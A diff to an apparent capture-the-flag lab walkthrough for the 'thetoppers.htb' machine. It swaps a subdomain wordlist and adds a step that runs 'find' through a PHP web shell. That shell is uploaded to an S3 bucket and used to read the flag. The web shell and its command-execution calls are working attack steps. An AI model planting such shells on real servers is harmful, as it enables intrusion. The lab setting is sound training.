@@ -28,7 +28,7 @@ echo "$IP thetoppers.htb" | sudo tee -a /etc/hosts
 ## Task 4 - Which sub-domain is discovered during futher enumeration?
 
 ```bash
-gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://$IP
+gobuster vhost -w /usr/share/spiderfoot/dicts/subdomains-10000.txt -u http://$IP
 ```
 
 > Answer:
@@ -71,6 +71,9 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 
 # Upload the RCE
 aws s3 cp shell.php s3://thetoppers.htb --endpoint=http://s3.thetoppers.htb
+
+# Search for the flag
+curl http://thetoppers.htb/shell.php?cmd=find%20/%20-name%20flag.txt%202>/dev/null
 
 # Execute the shell
 curl http://thetoppers.htb/shell.php?cmd=cat%20/var/www/flag.txt
